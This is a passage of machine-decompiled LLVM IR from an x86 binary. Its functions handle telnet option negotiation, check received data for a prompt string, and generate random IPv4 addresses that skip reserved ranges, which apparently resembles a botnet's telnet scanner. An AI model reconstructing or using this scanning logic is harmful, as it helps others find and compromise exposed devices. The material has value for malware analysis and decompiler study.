  store i32 %v2_804971c, i32* %v2_804971e, align 4
  %v4_8049720 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049723

dec_label_pc_8049723:                             ; preds = %dec_label_pc_80496bc, %dec_label_pc_8049701
  %storemerge1 = phi i32 [ %v4_8049720, %dec_label_pc_8049701 ], [ 0, %dec_label_pc_80496bc ]
  %v0_8049731 = load i32, i32* @global_var_8055908.26, align 8
  %v0_8049736 = load i32, i32* @global_var_805590c.27, align 4
  %v4_8049740 = icmp ne i32 %v0_8049731, 0
  %v2_8049743 = zext i1 %v4_8049740 to i32
  %v3_8049743 = add i32 %v0_8049736, -1
  %v4_8049743 = add i32 %v3_8049743, %v2_8049743
  store i32 %v4_8049743, i32* @ebx, align 4
  %v10_804974f = icmp eq i32 %v4_8049743, 0
  br i1 %v10_804974f, label %dec_label_pc_8049754, label %dec_label_pc_8049701

dec_label_pc_8049754:                             ; preds = %dec_label_pc_8049723
  %v1_8049740 = add i32 %v0_8049731, -1
  %v10_804975f = icmp ult i32 %storemerge1, %v1_8049740
  br i1 %v10_804975f, label %dec_label_pc_8049701, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_8049754
  %v2_804976f = mul i32 %v0_8049731, 4
  %v5_8049772 = add i32 %v2_804976f, %v1_80496f0
  %v1_8049775 = add i32 %v5_8049772, -4
  %v2_804977b = inttoptr i32 %v1_8049775 to i32*
  store i32 %v1_80496a3, i32* %v2_804977b, align 4
  %v0_804977d = load i32, i32* @global_var_805b988.28, align 8
  %v1_8049785 = call i32 @function_805074d(i32 %v0_804977d)
  store i32 %v1_80496f0, i32* @global_var_805b988.28, align 8
  br label %dec_label_pc_8049798

dec_label_pc_8049798:                             ; preds = %dec_label_pc_80496b1, %dec_label_pc_8049764
  ret i32 %v1_80496a3

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049704, { 1, 0 }
  uselistorder i32 %v1_80496f0, { 2, 0, 1 }
  uselistorder i32 %v0_80496bc, { 1, 0 }
  uselistorder label %dec_label_pc_8049798, { 1, 0 }
  uselistorder label %dec_label_pc_8049723, { 1, 0 }
  uselistorder label %dec_label_pc_8049701, { 1, 0 }
}

define i32 @function_80497a1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80497a1:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80497a1 = load i32, i32* @ebp, align 4
  store i32 %v0_80497a1, i32* %stack_var_-4, align 4
  %v1_80497aa = add i32 %arg2, 1
  %v1_80497ab = inttoptr i32 %v1_80497aa to i8*
  %v2_80497ab = load i8, i8* %v1_80497ab, align 1
  %v9_80497b4 = icmp ult i8 %v2_80497ab, -5
  br i1 %v9_80497b4, label %dec_label_pc_80498bf, label %dec_label_pc_80497c1

dec_label_pc_80497c1:                             ; preds = %dec_label_pc_80497a1
  %v7_80497c8 = icmp eq i8 %v2_80497ab, -1
  br i1 %v7_80497c8, label %dec_label_pc_80497ca, label %dec_label_pc_80497e4

dec_label_pc_80497ca:                             ; preds = %dec_label_pc_80497c1
  br label %dec_label_pc_80498bf

dec_label_pc_80497e4:                             ; preds = %dec_label_pc_80497c1
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80497f8 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049805 = call i32 @function_804fb14(i32 %arg1, i32 %v2_80497f8, i32 1, i32 16384)
  %v2_804980e = load i8, i8* %v1_80497ab, align 1
  %v11_8049811 = icmp eq i8 %v2_804980e, -4
  %v1_8049813 = icmp eq i1 %v11_8049811, false
  br i1 %v1_8049813, label %dec_label_pc_804981b, label %dec_label_pc_8049815

dec_label_pc_8049815:                             ; preds = %dec_label_pc_80497e4
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_804981b:                             ; preds = %dec_label_pc_80497e4
  %v2_804981f = load i8, i8* %v1_80497ab, align 1
  %v11_8049822 = icmp eq i8 %v2_804981f, -2
  %v1_8049824 = icmp eq i1 %v11_8049822, false
  br i1 %v1_8049824, label %dec_label_pc_804982c, label %dec_label_pc_8049826

dec_label_pc_8049826:                             ; preds = %dec_label_pc_804981b
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_804982c:                             ; preds = %dec_label_pc_804981b
  %v2_8049830 = load i8, i8* %v1_80497ab, align 1
  %v10_8049833 = icmp eq i8 %v2_8049830, 3
  %v1_8049835 = icmp eq i1 %v10_8049833, false
  %v11_804985c = icmp eq i8 %v2_8049830, -3
  %v1_804985e = icmp eq i1 %v11_804985c, false
  br i1 %v1_8049835, label %dec_label_pc_8049855, label %dec_label_pc_8049837

dec_label_pc_8049837:                             ; preds = %dec_label_pc_804982c
  %. = select i1 %v1_804985e, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_8049855:                             ; preds = %dec_label_pc_804982c
  %.3 = select i1 %v1_804985e, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_8049871:                             ; preds = %dec_label_pc_8049837, %dec_label_pc_8049826, %dec_label_pc_8049815, %dec_label_pc_8049855
  %v4_804988e = call i32 @function_804fb14(i32 %arg1, i32 %v2_80497f8, i32 1, i32 16384)
  %v1_8049896 = add i32 %arg2, 2
  %v4_80498b3 = call i32 @function_804fb14(i32 %arg1, i32 %v1_8049896, i32 1, i32 16384)
  %v2_80498c2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80498bf

dec_label_pc_80498bf:                             ; preds = %dec_label_pc_80497ca, %dec_label_pc_8049871, %dec_label_pc_80497a1
  %v2_80498c2 = phi i32 [ %v0_80497a1, %dec_label_pc_80497ca ], [ %v2_80498c2.pre, %dec_label_pc_8049871 ], [ %v0_80497a1, %dec_label_pc_80497a1 ]
  store i32 %v2_80498c2, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80498bf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049871, { 3, 0, 1, 2 }
}

define i32 @function_80498c4(i8* %arg1) local_unnamed_addr {
dec_label_pc_80498c4:
  %stack_var_-8 = alloca i32, align 4
  %v0_80498c7 = load i32, i32* @edi, align 4
  store i32 %v0_80498c7, i32* %stack_var_-8, align 4
  %v4_80498d2 = ptrtoint i8* %arg1 to i32
  %v3_80498e3 = call i32 @_strlen(i8* %arg1)
  %v4_80498e3 = mul i32 %v3_80498e3, -1
  %v1_80498e9 = sub i32 0, %v4_80498e3
  %v6_8049910 = sub i32 %v4_80498d2, %v4_80498e3
  br label %dec_label_pc_8049998

dec_label_pc_8049900:                             ; preds = %dec_label_pc_8049953, %dec_label_pc_804993b, %dec_label_pc_8049923, %dec_label_pc_804990b
  %v4_8049900 = add nsw i32 %stack_var_-12.011, 1
  %v7_8049909 = icmp slt i32 %v4_8049900, %v1_80498e9
  br i1 %v7_8049909, label %dec_label_pc_804990b, label %dec_label_pc_804996b

dec_label_pc_804990b:                             ; preds = %dec_label_pc_8049903.preheader, %dec_label_pc_8049900
  %stack_var_-12.011 = phi i32 [ %v4_8049900, %dec_label_pc_8049900 ], [ %stack_var_-12.1, %dec_label_pc_8049903.preheader ]
  %v2_8049918 = sub i32 %v6_8049910, %stack_var_-12.011
  %v1_804991c = inttoptr i32 %v2_8049918 to i8*
  %v2_804991c = load i8, i8* %v1_804991c, align 1
  %v4_804991f = icmp eq i8 %v2_804991c, 0
  br i1 %v4_804991f, label %dec_label_pc_8049900, label %dec_label_pc_8049923

dec_label_pc_8049923:                             ; preds = %dec_label_pc_804990b
  %v2_8049934 = load i8, i8* %v1_804991c, align 1
  %v7_8049937 = icmp eq i8 %v2_8049934, 32
  br i1 %v7_8049937, label %dec_label_pc_8049900, label %dec_label_pc_804993b

dec_label_pc_804993b:                             ; preds = %dec_label_pc_8049923
  %v2_804994c = load i8, i8* %v1_804991c, align 1
  %v10_804994f = icmp eq i8 %v2_804994c, 13
  br i1 %v10_804994f, label %dec_label_pc_8049900, label %dec_label_pc_8049953

dec_label_pc_8049953:                             ; preds = %dec_label_pc_804993b
  %v2_8049964 = load i8, i8* %v1_804991c, align 1
  %v10_8049967 = icmp eq i8 %v2_8049964, 10
  br i1 %v10_8049967, label %dec_label_pc_8049900, label %dec_label_pc_804996b

dec_label_pc_804996b:                             ; preds = %dec_label_pc_8049953, %dec_label_pc_8049900, %dec_label_pc_8049903.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049903.preheader ], [ %stack_var_-12.011, %dec_label_pc_8049953 ], [ %v4_8049900, %dec_label_pc_8049900 ]
  %v2_8049978 = sub i32 %v6_8049910, %stack_var_-12.0.lcssa
  %v1_804997c = inttoptr i32 %v2_8049978 to i8*
  %v2_804997c = load i8, i8* %v1_804997c, align 1
  %v6_8049982 = add i32 %storemerge1, ptrtoint ([6 x i8]* @global_var_8052e5c.29 to i32)
  %v1_8049985 = inttoptr i32 %v6_8049982 to i8*
  %v2_8049985 = load i8, i8* %v1_8049985, align 1
  %v15_8049988 = icmp eq i8 %v2_804997c, %v2_8049985
  %v1_804998a = icmp eq i1 %v15_8049988, false
  br i1 %v1_804998a, label %dec_label_pc_8049995, label %dec_label_pc_80499c2

dec_label_pc_8049995:                             ; preds = %dec_label_pc_804996b
  %v4_8049995 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049998

dec_label_pc_8049998:                             ; preds = %dec_label_pc_80498c4, %dec_label_pc_8049995
  %stack_var_-12.1 = phi i32 [ 0, %dec_label_pc_80498c4 ], [ %stack_var_-12.0.lcssa, %dec_label_pc_8049995 ]
  %storemerge1 = phi i32 [ 0, %dec_label_pc_80498c4 ], [ %v4_8049995, %dec_label_pc_8049995 ]
  %v3_80499ac = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8052e5c.29, i32 0, i32 0))
  %v7_80499b3 = icmp ult i32 %storemerge1, %v3_80499ac
  br i1 %v7_80499b3, label %dec_label_pc_8049903.preheader, label %dec_label_pc_80499c2

dec_label_pc_8049903.preheader:                   ; preds = %dec_label_pc_8049998
  %v7_804990910 = icmp slt i32 %stack_var_-12.1, %v1_80498e9
  br i1 %v7_804990910, label %dec_label_pc_804990b, label %dec_label_pc_804996b

dec_label_pc_80499c2:                             ; preds = %dec_label_pc_8049998, %dec_label_pc_804996b
  %storemerge = phi i32 [ 1, %dec_label_pc_804996b ], [ 0, %dec_label_pc_8049998 ]
  %v2_80499c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80499c8, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8052e5c.29, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049998, { 1, 0 }
  uselistorder label %dec_label_pc_804996b, { 2, 0, 1 }
}

define i32 @function_80499cb() local_unnamed_addr {
dec_label_pc_80499cb:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80499ce = load i32, i32* @edi, align 4
  store i32 %v0_80499ce, i32* %stack_var_-8, align 4
  store i32 %tmp20, i32* %stack_var_-168, align 4
  %v2_8049a11 = ptrtoint i32* %stack_var_-160 to i32
  %tmp31 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049a2b = urem i32 %tmp14, 32
  %v9_8049a2e = shl i32 1, %v1_8049a2b
  %v1_8049a39 = add i32 %tmp14, 1
  %v2_8049a3a = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049b3b = inttoptr i32 %tmp7 to i8*
  %v4_8049b4e = icmp eq i32 %tmp6, 0
  %v1_8049b5a = inttoptr i32 %tmp9 to i8*
  %tmp32 = icmp slt i32 %tmp19, 1
  %tmp33 = icmp eq i1 %tmp32, false
  %v1_8049b6f39 = add i32 %tmp24, 2
  %v5_8049b7546 = icmp slt i32 %v1_8049b6f39, %tmp
  br i1 %v5_8049b7546, label %dec_label_pc_8049b77.lr.ph, label %dec_label_pc_8049b93

dec_label_pc_8049b77.lr.ph:                       ; preds = %dec_label_pc_80499cb
  %v2_8049a25 = udiv i32 %tmp14, 32
  %v2_8049a2e = mul nuw nsw i32 %v2_8049a25, 4
  %v3_8049a2e = add nsw i32 %v2_8049a2e, -156
  br label %dec_label_pc_8049b77

dec_label_pc_8049a07:                             ; preds = %dec_label_pc_8049b85, %dec_label_pc_8049b77
  store i32 %v2_8049a11, i32* @edi, align 4
  %v5_8049a18 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v0_8049a2e = load i32, i32* @ebp, align 4
  %v4_8049a2e = add i32 %v3_8049a2e, %v0_8049a2e
  %v5_8049a2e = inttoptr i32 %v4_8049a2e to i32*
  %v6_8049a2e = load i32, i32* %v5_8049a2e, align 4
  %v12_8049a2e = or i32 %v6_8049a2e, %v9_8049a2e
  store i32 %v12_8049a2e, i32* %v5_8049a2e, align 4
  %v6_8049a61 = call i32 @function_804e51c(i32 %v1_8049a39, i32 %v2_8049a11, i32 0, i32 0, i32 %v2_8049a3a)
  %tmp34 = icmp slt i32 %v6_8049a61, 1
  br i1 %tmp34, label %dec_label_pc_8049b93, label %dec_label_pc_8049a6e

dec_label_pc_8049a6e:                             ; preds = %dec_label_pc_8049a07
  %v5_8049a71 = add i32 %v4_8049b6c47, %tmp9
  %v5_8049a74 = inttoptr i32 %v5_8049a71 to i8*
  %v5_8049a94 = call i32 @function_804fae0(i32 %tmp14, i32 %v5_8049a71, i32 1, i32 0)
  %v14_8049a9c = icmp eq i32 %v5_8049a94, -1
  br i1 %v14_8049a9c, label %dec_label_pc_8049baf, label %dec_label_pc_8049aa2

dec_label_pc_8049aa2:                             ; preds = %dec_label_pc_8049a6e
  %v5_8049aa2 = icmp eq i32 %v5_8049a94, 0
  %v1_8049aa6 = icmp eq i1 %v5_8049aa2, false
  br i1 %v1_8049aa6, label %dec_label_pc_8049ab7, label %dec_label_pc_8049baf

dec_label_pc_8049ab7:                             ; preds = %dec_label_pc_8049aa2
  %v6_8049aba = add i32 %v5_8049a94, %v4_8049b6c47
  %v26_8049aba = inttoptr i32 %v6_8049aba to i8*
  %v2_8049ac0 = load i8, i8* %v5_8049a74, align 1
  %v11_8049ac3 = icmp eq i8 %v2_8049ac0, -1
  %v1_8049ac5 = icmp eq i1 %v11_8049ac3, false
  br i1 %v1_8049ac5, label %dec_label_pc_8049b38, label %dec_label_pc_8049ac7

dec_label_pc_8049ac7:                             ; preds = %dec_label_pc_8049ab7
  %v1_8049aca = add i32 %v5_8049a71, 1
  %v5_8049ae5 = call i32 @function_804fae0(i32 %tmp14, i32 %v1_8049aca, i32 2, i32 0)
  %v14_8049aed = icmp eq i32 %v5_8049ae5, -1
  br i1 %v14_8049aed, label %dec_label_pc_8049baf, label %dec_label_pc_8049af3

dec_label_pc_8049af3:                             ; preds = %dec_label_pc_8049ac7
  %v5_8049af3 = icmp eq i32 %v5_8049ae5, 0
  %v1_8049af7 = icmp eq i1 %v5_8049af3, false
  br i1 %v1_8049af7, label %dec_label_pc_8049b08, label %dec_label_pc_8049baf

dec_label_pc_8049b08:                             ; preds = %dec_label_pc_8049af3
  %v6_8049b0b = add i32 %v5_8049ae5, %v6_8049aba
  %v26_8049b0b = inttoptr i32 %v6_8049b0b to i8*
  %v4_8049b23 = call i32 @function_80497a1(i32 %tmp14, i32 %v5_8049a71, i32 3)
  %v1_8049b28 = icmp eq i32 %v4_8049b23, 0
  %v1_8049b2a = icmp eq i1 %v1_8049b28, false
  br i1 %v1_8049b2a, label %dec_label_pc_8049b6c.backedge, label %dec_label_pc_8049baf

dec_label_pc_8049b6c.backedge:                    ; preds = %dec_label_pc_8049b08, %dec_label_pc_8049b4e, %dec_label_pc_8049b54
  %stack_var_-32.0.be = phi i8* [ %v26_8049aba, %dec_label_pc_8049b4e ], [ %v26_8049aba, %dec_label_pc_8049b54 ], [ %v26_8049b0b, %dec_label_pc_8049b08 ]
  %v4_8049b6c = ptrtoint i8* %stack_var_-32.0.be to i32
  %v1_8049b6f = add i32 %v4_8049b6c, 2
  %v5_8049b75 = icmp slt i32 %v1_8049b6f, %tmp
  br i1 %v5_8049b75, label %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge, label %dec_label_pc_8049b93

dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge: ; preds = %dec_label_pc_8049b6c.backedge
  %v3_8049b77.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049b77

dec_label_pc_8049b38:                             ; preds = %dec_label_pc_8049ab7
  %v4_8049b45 = call i32 @function_804f744(i32 %tmp9, i8* %v5_8049b3b)
  %v1_8049b4a = icmp eq i32 %v4_8049b45, 0
  %v1_8049b4c = icmp eq i1 %v1_8049b4a, false
  br i1 %v1_8049b4c, label %dec_label_pc_8049b93, label %dec_label_pc_8049b4e

dec_label_pc_8049b4e:                             ; preds = %dec_label_pc_8049b38
  br i1 %v4_8049b4e, label %dec_label_pc_8049b6c.backedge, label %dec_label_pc_8049b54

dec_label_pc_8049b54:                             ; preds = %dec_label_pc_8049b4e
  %v2_8049b5a = call i32 @function_80498c4(i8* %v1_8049b5a)
  %v1_8049b5f = icmp eq i32 %v2_8049b5a, 0
  br i1 %v1_8049b5f, label %dec_label_pc_8049b6c.backedge, label %dec_label_pc_8049b93

dec_label_pc_8049b77:                             ; preds = %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge, %dec_label_pc_8049b77.lr.ph
  %v3_8049b77 = phi i32 [ %tmp20, %dec_label_pc_8049b77.lr.ph ], [ %v3_8049b77.pre, %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge ]
  %v4_8049b6c47 = phi i32 [ %tmp24, %dec_label_pc_8049b77.lr.ph ], [ %v4_8049b6c, %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge ]
  %tmp35 = icmp slt i32 %v3_8049b77, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8049a07, label %dec_label_pc_8049b85

dec_label_pc_8049b85:                             ; preds = %dec_label_pc_8049b77
  br i1 %tmp33, label %dec_label_pc_8049a07, label %dec_label_pc_8049b93

dec_label_pc_8049b93:                             ; preds = %dec_label_pc_8049a07, %dec_label_pc_8049b85, %dec_label_pc_8049b6c.backedge, %dec_label_pc_8049b54, %dec_label_pc_8049b38, %dec_label_pc_80499cb
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_80499cb ], [ 1, %dec_label_pc_8049b38 ], [ 1, %dec_label_pc_8049b54 ], [ 0, %dec_label_pc_8049b6c.backedge ], [ 0, %dec_label_pc_8049b85 ], [ 0, %dec_label_pc_8049a07 ]
  br label %dec_label_pc_8049baf

dec_label_pc_8049baf:                             ; preds = %dec_label_pc_8049b08, %dec_label_pc_8049ac7, %dec_label_pc_8049af3, %dec_label_pc_8049a6e, %dec_label_pc_8049aa2, %dec_label_pc_8049b93
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b93 ], [ 0, %dec_label_pc_8049aa2 ], [ 0, %dec_label_pc_8049a6e ], [ 0, %dec_label_pc_8049af3 ], [ 0, %dec_label_pc_8049ac7 ], [ 0, %dec_label_pc_8049b08 ]
  %v2_8049bbb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049bbb, i32* @edi, align 4
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %v5_8049ae5, { 1, 2, 0 }
  uselistorder i32 %v5_8049a94, { 1, 2, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %tmp14, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %tmp9, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804fae0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049baf, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b93, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049b6c.backedge, { 2, 1, 0 }
}

define i32 @function_8049bbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_8049bbe:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049bc1 = load i32, i32* @esi, align 4
  %v0_8049bc2 = load i32, i32* @ebx, align 4
  store i32 %v0_8049bc2, i32* %stack_var_-12, align 4
  %v2_8049bcd = call i32 @function_8050a20(i32 0)
  %v2_8049bef = sdiv i32 %v2_8049bcd, 51
  store i32 %v2_8049bef, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049bef, -253
  %v2_8049c05 = add i32 %v2_8049bcd, %tmp
  store i32 %v2_8049c05, i32* @eax, align 4
  %v1_8049c11 = call i32 @function_8050a20(i32 -2122019415)
  %v2_8049c33 = sdiv i32 %v1_8049c11, 51
  store i32 %v2_8049c33, i32* @ebx, align 4
  %tmp68 = mul i32 %v2_8049c33, -255
  %v2_8049c43 = add i32 %v1_8049c11, %tmp68
  store i32 %v2_8049c43, i32* @eax, align 4
  %v1_8049c4f = call i32 @function_8050a20(i32 -2139062143)
  %v2_8049c71 = sdiv i32 %v1_8049c4f, 51
  store i32 %v2_8049c71, i32* @ebx, align 4
  %tmp69 = mul i32 %v2_8049c71, -255
  %v2_8049c81 = add i32 %v1_8049c4f, %tmp69
  store i32 %v2_8049c81, i32* @eax, align 4
  %v1_8049c8d = call i32 @function_8050a20(i32 -2139062143)
  %v2_8049caf = sdiv i32 %v1_8049c8d, 51
  store i32 %v2_8049caf, i32* @ebx, align 4
  %tmp70 = mul i32 %v2_8049caf, -255
  %v2_8049cbf = add i32 %v1_8049c8d, %tmp70
  br label %dec_label_pc_8049dce

dec_label_pc_8049cd0:                             ; preds = %dec_label_pc_8049e32, %dec_label_pc_8049ee2, %dec_label_pc_8049ed6, %dec_label_pc_8049eba, %dec_label_pc_8049e9e, %dec_label_pc_8049e92, %dec_label_pc_8049e7e, %dec_label_pc_8049e6a, %dec_label_pc_8049e4e, %dec_label_pc_8049e16, %dec_label_pc_8049e02, %dec_label_pc_8049df6, %dec_label_pc_8049dda, %dec_label_pc_8049dce
  %sext31 = mul i32 %storemerge37.in, 16777216
  %v2_8049cd0 = sdiv i32 %sext31, 16777216
  %v3_8049cd0 = call i32 @function_8050a20(i32 %v2_8049cd0)
  %v2_8049cf2 = sdiv i32 %v3_8049cd0, 51
  store i32 %v2_8049cf2, i32* @ebx, align 4
  %tmp71 = mul i32 %v2_8049cf2, -253
  %v2_8049d08 = add i32 %v3_8049cd0, %tmp71
  store i32 %v2_8049d08, i32* @eax, align 4
  %v1_8049d14 = call i32 @function_8050a20(i32 -2122019415)
  %v2_8049d36 = sdiv i32 %v1_8049d14, 51
  store i32 %v2_8049d36, i32* @ebx, align 4
  %tmp72 = mul i32 %v2_8049d36, -255
  %v2_8049d46 = add i32 %v1_8049d14, %tmp72
  store i32 %v2_8049d46, i32* @eax, align 4
  %v1_8049d52 = call i32 @function_8050a20(i32 -2139062143)
  %v2_8049d74 = sdiv i32 %v1_8049d52, 51
  store i32 %v2_8049d74, i32* @ebx, align 4
  %tmp73 = mul i32 %v2_8049d74, -255
  %v2_8049d84 = add i32 %v1_8049d52, %tmp73
  store i32 %v2_8049d84, i32* @eax, align 4
  %v1_8049d90 = call i32 @function_8050a20(i32 -2139062143)
  %v2_8049db2 = sdiv i32 %v1_8049d90, 51
  store i32 %v2_8049db2, i32* @ebx, align 4
  %tmp74 = mul i32 %v2_8049db2, -255
  %v2_8049dc2 = add i32 %v1_8049d90, %tmp74
  br label %dec_label_pc_8049dce

dec_label_pc_8049dce:                             ; preds = %dec_label_pc_8049bbe, %dec_label_pc_8049cd0
  %storemerge37.in = phi i32 [ %v2_8049dc2, %dec_label_pc_8049cd0 ], [ %v2_8049cbf, %dec_label_pc_8049bbe ]
  %stack_var_-15.0.in.in = phi i32 [ %v2_8049d46, %dec_label_pc_8049cd0 ], [ %v2_8049c43, %dec_label_pc_8049bbe ]
  %stack_var_-14.0.in.in = phi i32 [ %v2_8049d84, %dec_label_pc_8049cd0 ], [ %v2_8049c81, %dec_label_pc_8049bbe ]
  %stack_var_-16.0.in = phi i32 [ %v2_8049d08, %dec_label_pc_8049cd0 ], [ %v2_8049c05, %dec_label_pc_8049bbe ]
  %stack_var_-15.0.in = trunc i32 %stack_var_-15.0.in.in to i8
  %stack_var_-14.0.in = trunc i32 %stack_var_-14.0.in.in to i8
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %v3_8049dd2 = trunc i32 %stack_var_-16.0.in to i8
  %v4_8049dd2 = icmp eq i8 %v3_8049dd2, 0
  br i1 %v4_8049dd2, label %dec_label_pc_8049cd0, label %dec_label_pc_8049dda

dec_label_pc_8049dda:                             ; preds = %dec_label_pc_8049dce
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %v10_8049dde = icmp eq i8 %v3_8049dd2, 10
  br i1 %v10_8049dde, label %dec_label_pc_8049cd0, label %dec_label_pc_8049de6

dec_label_pc_8049de6:                             ; preds = %dec_label_pc_8049dda
  %v10_8049dea = icmp eq i8 %v3_8049dd2, 100
  %v1_8049dec = icmp eq i1 %v10_8049dea, false
  br i1 %v1_8049dec, label %dec_label_pc_8049e02, label %dec_label_pc_8049dee

dec_label_pc_8049dee:                             ; preds = %dec_label_pc_8049de6
  %tmp66 = icmp ult i8 %stack_var_-15.0.in, 64
  br i1 %tmp66, label %dec_label_pc_8049e02, label %dec_label_pc_8049df6

dec_label_pc_8049df6:                             ; preds = %dec_label_pc_8049dee
  %v4_8049dee16 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049dee16, i32* @eax, align 4
  %v5_8049dfa = icmp slt i8 %stack_var_-15.0.in, 0
  %v1_8049dfc = icmp eq i1 %v5_8049dfa, false
  br i1 %v1_8049dfc, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e02

dec_label_pc_8049e02:                             ; preds = %dec_label_pc_8049df6, %dec_label_pc_8049dee, %dec_label_pc_8049de6
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %v10_8049e06 = icmp eq i8 %v3_8049dd2, 127
  br i1 %v10_8049e06, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e0e

dec_label_pc_8049e0e:                             ; preds = %dec_label_pc_8049e02
  %v11_8049e12 = icmp eq i8 %v3_8049dd2, -87
  %v1_8049e14 = icmp eq i1 %v11_8049e12, false
  br i1 %v1_8049e14, label %dec_label_pc_8049e22, label %dec_label_pc_8049e16

dec_label_pc_8049e16:                             ; preds = %dec_label_pc_8049e0e
  %v4_8049e1618 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049e1618, i32* @eax, align 4
  %v11_8049e1a = icmp eq i8 %stack_var_-15.0.in, -2
  br i1 %v11_8049e1a, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e22

dec_label_pc_8049e22:                             ; preds = %dec_label_pc_8049e16, %dec_label_pc_8049e0e
  %v11_8049e26 = icmp eq i8 %v3_8049dd2, -84
  %v1_8049e28 = icmp eq i1 %v11_8049e26, false
  br i1 %v1_8049e28, label %dec_label_pc_8049e3e, label %dec_label_pc_8049e2a

dec_label_pc_8049e2a:                             ; preds = %dec_label_pc_8049e22
  %tmp67 = icmp ult i8 %stack_var_-15.0.in, 17
  br i1 %tmp67, label %dec_label_pc_8049e32, label %dec_label_pc_8049e3e

dec_label_pc_8049e32:                             ; preds = %dec_label_pc_8049e2a
  %v4_8049e2a19 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049e2a19, i32* @eax, align 4
  br label %dec_label_pc_8049cd0

dec_label_pc_8049e3e:                             ; preds = %dec_label_pc_8049e2a, %dec_label_pc_8049e22
  %v8_8049e42 = icmp eq i8 %v3_8049dd2, -64
  %v1_8049e44 = icmp eq i1 %v8_8049e42, false
  br i1 %v1_8049e44, label %dec_label_pc_8049e76, label %dec_label_pc_8049e46

dec_label_pc_8049e46:                             ; preds = %dec_label_pc_8049e3e
  %v4_8049e4620 = urem i32 %stack_var_-15.0.in.in, 256
  %v4_8049e4a = icmp eq i8 %stack_var_-15.0.in, 0
  %v1_8049e4c = icmp eq i1 %v4_8049e4a, false
  br i1 %v1_8049e4c, label %dec_label_pc_8049e62, label %dec_label_pc_8049e4e

dec_label_pc_8049e4e:                             ; preds = %dec_label_pc_8049e46
  %v4_8049e4e21 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049e4e21, i32* @eax, align 4
  %v10_8049e52 = icmp eq i8 %stack_var_-14.0.in, 2
